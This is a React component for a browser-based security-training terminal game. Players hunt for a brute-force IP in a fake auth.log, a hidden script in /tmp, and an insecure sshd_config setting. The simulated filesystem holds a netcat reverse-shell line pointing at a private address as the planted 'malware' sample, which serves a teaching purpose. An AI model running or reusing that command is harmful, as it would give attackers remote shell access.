import React, { useState, useRef, useEffect } from 'react';
import './Sentinel.css';

const INITIAL_VFS = {
    '/': { type: 'dir', children: ['var', 'etc', 'tmp', 'home'] },
    '/var': { type: 'dir', children: ['log'] },
    '/var/log': { type: 'dir', children: ['auth.log', 'syslog'] },
    '/var/log/auth.log': { type: 'file', content: 'Jan 18 10:01:02 sentinel sshd[1234]: Failed password for root from 192.168.1.45 port 5678 ssh2\nJan 18 10:01:05 sentinel sshd[1234]: Failed password for root from 192.168.1.45 port 5679 ssh2\nJan 18 10:01:08 sentinel sshd[1234]: Failed password for root from 192.168.1.45 port 5680 ssh2\nJan 18 10:01:12 sentinel sshd[1234]: Accepted password for root from 192.168.1.45 port 5681 ssh2' },
    '/var/log/syslog': { type: 'file', content: 'Jan 18 09:00:00 systemd: Started Periodic Command Scheduler.\nJan 18 09:15:00 ntpd: Synchronized to time server.' },
    '/etc': { type: 'dir', children: ['sshd_config', 'hosts'] },
    '/etc/sshd_config': { type: 'file', content: 'PermitRootLogin yes\nPasswordAuthentication yes\nPort 22' },
    '/etc/hosts': { type: 'file', content: '127.0.0.1 localhost\n192.168.1.1 gateway' },
    '/tmp': { type: 'dir', children: ['.hidden_script.sh'] },
    '/tmp/.hidden_script.sh': { type: 'file', content: '#!/bin/bash\n# Reverse shell payload\nnc -e /bin/sh 10.0.0.5 4444' },
    '/home': { type: 'dir', children: ['analyst'] },
    '/home/analyst': { type: 'dir', children: ['notes.txt'] },
    '/home/analyst/notes.txt': { type: 'file', content: 'Mission 1: Check auth.log for brute force.\nMission 2: Hunt for hidden scripts in /tmp.\nMission 3: Fix sshd_config root login risk.' }
};

const MISSIONS = [
    { id: 1, title: 'Brute Force Hunter', goal: 'Find the IP address attacking root in auth.log', target: '192.168.1.45' },
    { id: 2, title: 'Malware Hunt', goal: 'Find the hidden script in /tmp', target: 'nc -e /bin/sh' },
    { id: 3, title: 'Config Audit', goal: 'Identify the insecure setting in sshd_config', target: 'PermitRootLogin yes' }
];

const TerminalChallenge = () => {
    const [cwd, setCwd] = useState('/');
    const [history, setHistory] = useState([
        'Sentinel Terminal OS v1.0.4-stable',
        'Type "help" for a list of commands.',
        ''
    ]);
    const [input, setInput] = useState('');
    const [currentMission, setCurrentMission] = useState(0);
    const scrollRef = useRef(null);

    useEffect(() => {
        if (scrollRef.current) {
            scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
        }
    }, [history]);

    const resolvePath = (path) => {
        if (path.startsWith('/')) return path;
        if (cwd === '/') return '/' + path;
        return cwd.endsWith('/') ? cwd + path : cwd + '/' + path;
    };

    const handleCommand = (cmdStr) => {
        const parts = cmdStr.trim().split(/\s+/);
        const command = parts[0].toLowerCase();
        const args = parts.slice(1);
        let output = '';

        setHistory(prev => [...prev, `analyst@sentinel:${cwd}$ ${cmdStr}`]);

        switch (command) {
            case 'help':
                output = 'Available commands: ls, cd, cat, grep, pwd, clear, help';
                break;
            case 'pwd':
                output = cwd;
                break;
            case 'ls':
                const dir = INITIAL_VFS[cwd];
                output = dir.children.join('  ');
                break;
            case 'cd':
                const newPath = args[0] === '..' ?
                    (cwd.substring(0, cwd.lastIndexOf('/')) || '/') :
                    resolvePath(args[0]);
                if (INITIAL_VFS[newPath] && INITIAL_VFS[newPath].type === 'dir') {
                    setCwd(newPath);
                } else {
                    output = `cd: no such directory: ${args[0]}`;
                }
                break;
            case 'cat':
                const filePath = resolvePath(args[0]);
                if (INITIAL_VFS[filePath] && INITIAL_VFS[filePath].type === 'file') {
                    output = INITIAL_VFS[filePath].content;
                    // Check mission target
                    if (output.includes(MISSIONS[currentMission].target)) {
                        setTimeout(() => {
                            setHistory(prev => [...prev, '>>> MISSION OBJECTIVE IDENTIFIED! <<<', '']);
                            if (currentMission < MISSIONS.length - 1) setCurrentMission(m => m + 1);
                        }, 500);
                    }
                } else {
                    output = `cat: ${args[0]}: No such file`;
                }
                break;
            case 'grep':
                const pattern = args[0];
                const file = resolvePath(args[1]);
                if (INITIAL_VFS[file] && INITIAL_VFS[file].type === 'file') {
                    output = INITIAL_VFS[file].content.split('\n')
                        .filter(line => line.includes(pattern))
                        .join('\n');
                    if (output.includes(MISSIONS[currentMission].target)) {
                        setTimeout(() => {
                            setHistory(prev => [...prev, '>>> MISSION OBJECTIVE IDENTIFIED! <<<', '']);
                            if (currentMission < MISSIONS.length - 1) setCurrentMission(m => m + 1);
                        }, 500);
                    }
                } else {
                    output = `grep: ${args[1]}: No such file`;
                }
                break;
            case 'clear':
                setHistory([]);
                return;
            case '':
                return;
            default:
                output = `command not found: ${command}`;
        }

        if (output) setHistory(prev => [...prev, output]);
    };

    return (
        <div className="sentinel-view animate-fade-in">
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 300px', gap: '2rem' }}>
                <div className="terminal-container glass-card" style={{
                    background: '#000',
                    border: '1px solid #333',
                    padding: '0',
                    overflow: 'hidden',
                    display: 'flex',
                    flexDirection: 'column',
                    height: '600px'
                }}>
                    <div className="terminal-header" style={{ background: '#222', padding: '0.5rem 1rem', fontSize: '0.8rem', opacity: 0.7 }}>
                        Terminal - analyst@sentinel
                    </div>
                    <div className="terminal-body" ref={scrollRef} style={{
                        flex: 1,
                        padding: '1rem',
                        fontFamily: 'monospace',
                        overflowY: 'auto',
                        color: '#0f0',
                        whiteSpace: 'pre-wrap'
                    }}>
                        {history.map((line, i) => <div key={i}>{line}</div>)}
                        <div style={{ display: 'flex', gap: '0.5rem' }}>
                            <span>analyst@sentinel:{cwd}$</span>
                            <input
                                autoFocus
                                type="text"
                                value={input}
                                onChange={(e) => setInput(e.target.value)}
                                onKeyDown={(e) => {
                                    if (e.key === 'Enter') {
                                        handleCommand(input);
                                        setInput('');
                                    }
                                }}
                                style={{
                                    background: 'none',
                                    border: 'none',
                                    outline: 'none',
                                    color: '#fff',
                                    fontFamily: 'monospace',
                                    flex: 1
                                }}
                            />
                        </div>
                    </div>
                </div>

                <div className="mission-sidebar glass-card">
                    <h3 style={{ borderBottom: '1px solid var(--sentinel-border)', paddingBottom: '0.5rem', marginBottom: '1rem' }}>
                        Mission Audit
                    </h3>
                    <div className="mission-list">
                        {MISSIONS.map((m, i) => (
                            <div key={m.id} style={{
                                marginBottom: '1.5rem',
                                opacity: i > currentMission ? 0.3 : 1,
                                borderLeft: `2px solid ${i < currentMission ? 'var(--sentinel-success)' : i === currentMission ? 'var(--sentinel-accent)' : 'var(--sentinel-border)'}`,
                                paddingLeft: '1rem'
                            }}>
                                <div style={{ fontSize: '0.7rem', fontWeight: 'bold' }}>MISSION 0{m.id}</div>
                                <div style={{ fontWeight: 'bold', color: i < currentMission ? 'var(--sentinel-success)' : 'inherit' }}>
                                    {m.title} {i < currentMission && '✓'}
                                </div>
                                <div style={{ fontSize: '0.8rem', opacity: 0.7 }}>{m.goal}</div>
                            </div>
                        ))}
                    </div>
                    {currentMission === MISSIONS.length - 1 && history.some(l => l.includes('IDENTIFIED')) && (
                        <div className="badge badge-low" style={{ width: '100%', textAlign: 'center' }}>
                            All Missions Complete
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
};

export default TerminalChallenge;
